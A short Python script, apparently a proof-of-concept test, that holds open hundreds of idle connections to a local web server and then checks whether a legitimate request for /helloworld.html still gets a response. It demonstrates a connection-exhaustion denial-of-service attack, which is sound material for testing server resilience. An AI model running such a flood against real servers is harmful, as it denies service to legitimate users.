import socket, sys, time
port = int(sys.argv[1])
held = []
for _ in range(600):
    try:
        held.append(socket.create_connection(("localhost", port), timeout=3))
    except OSError:
        break
print(f"attacker: opened {len(held)} idle connections, sent nothing")
time.sleep(1)
print("legit client: GET /helloworld.html")
try:
    s = socket.create_connection(("localhost", port), timeout=5)
    s.sendall(b"GET /helloworld.html HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    d = b""
    while (c := s.recv(4096)):
        d += c
    print("legit client got:", d.split(b"\r\n")[0].decode() if d else "NOTHING (connection closed with no response)")
except OSError as e:
    print("legit client got: error", e)
